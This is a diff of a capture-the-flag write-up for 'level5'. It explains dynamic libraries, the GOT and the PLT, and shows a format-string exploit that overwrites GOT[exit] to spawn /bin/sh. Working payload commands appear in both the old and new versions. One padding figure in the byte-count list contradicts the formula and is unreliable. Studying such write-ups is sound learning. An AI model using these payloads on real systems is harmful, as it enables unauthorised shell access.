@@ -1,10 +1,51 @@
 # level5 — Format String + GOT Overwrite
  
 ## Vulnerability
- 
+
 `n()` passes user input directly to `printf()` without a format string → **Format String vulnerability**.  
 `exit()` is called at the end → we **overwrite GOT[exit]** to redirect it to `o()` which calls `system("/bin/sh")`.
- 
+
+---
+
+## Dynamic libraries and the GOT
+
+### Dynamic libraries
+
+A dynamic library (`.so` on Linux) is compiled code that lives in a separate file and is **shared between all processes** that use it. libc (`libc.so.6`) is the classic example — every C program calls `printf`, `exit`, etc., but instead of copying those functions into every binary, the OS maps a single copy of libc into each process's address space at load time.
+
+Because ASLR randomises where that mapping lands, the binary cannot know the final address of `exit` at compile time. It needs a level of indirection.
+
+### The GOT (Global Offset Table)
+
+The GOT is a writable table in the binary's own data segment. Each external function gets one slot:
+
+```
+GOT[exit]   → (filled by the dynamic linker at load time with the real address of exit in libc)
+GOT[printf] → ...
+GOT[fgets]  → ...
+```
+
+Every call to `exit()` in the code actually goes through the **PLT** (Procedure Linkage Table), a small stub:
+
+```asm
+exit@plt:
+    jmp *GOT[exit]      ; jump to whatever address is stored in the GOT slot
+    push <reloc index>  ; (only reached on first call — triggers lazy binding)
+    jmp  _dl_resolve
+```
+
+On the first call the dynamic linker resolves the real address and writes it into `GOT[exit]`. From then on the slot always holds the real libc address.
+
+### Why this is exploitable
+
+The GOT lives in a **writable** data segment. If we can write an arbitrary value into `GOT[exit]`, the next `exit()` call will jump to our chosen address instead of libc's `exit`. Here we overwrite it with the address of `o()` — a function already in the binary that calls `system("/bin/sh")`.
+
+```
+exit(1)  →  jmp *GOT[exit]  →  (we wrote &o() there)  →  o()  →  system("/bin/sh")
+```
+
+---
+
 ## Recon
  
 ```bash
@@ -19,24 +60,26 @@ echo "AAAA %x %x %x %x %x %x %x %x" | ./level5
 ```
  
 ## Exploit
- 
-Target: write `0x080484a4` (address of `o()`) into `0x08049838` (GOT[exit])
- 
-Split into two 16-bit writes (`%hn`):
-- `0x84a4` = 33956 → write to `0x08049838`
-- `0x0804` = 2052  → write to `0x0804983a`
+
+Target: write `0x080484a4` = **134513828** (address of `o()`) into `0x08049838` (GOT[exit]).
+
+Our input sits at **position 4** on the stack (confirmed in Recon). We plant the GOT address at the very start of the payload so `%4$n` will write into it.
+
+Byte count when `%4$n` fires:
+- `\x38\x98\x04\x08` → 4 bytes (the address itself)
+- `_` → 1 byte
+- `%.134513828x` → 134513828 bytes (width padding on a dummy stack value)
+- `_` → 1 byte
+
+We need `printf` to have written exactly **134513828** bytes, so:
+
+```
+padding = 0x080484a4 − 4 (addr) − 1 (_) − 1 (_) = 134513822
+```
+
 ```bash
-(python -c "
-import struct
-addr_low  = struct.pack('<I', 0x08049838)   # GOT[exit] low word
-addr_high = struct.pack('<I', 0x0804983a)   # GOT[exit] high word
-payload = addr_low + addr_high
-payload += '%33948d'   # pad to 33956 total chars (33956 - 8 bytes already written)
-payload += '%4\$hn'    # write 0x84a4 at 0x08049838
-payload += '%33632d'   # pad to wrap around: 33956 + 33632 = 67588 → 67588 % 65536 = 0x0804
-payload += '%5\$hn'    # write 0x0804 at 0x0804983a
-print payload
-"; cat) | ./level5
+python -c "print('\x38\x98\x04\x08' + '_%.134513822x_%4\$n')" > /tmp/exploit
+cat /tmp/exploit - | ./level5
 ```
  
 ## Flow
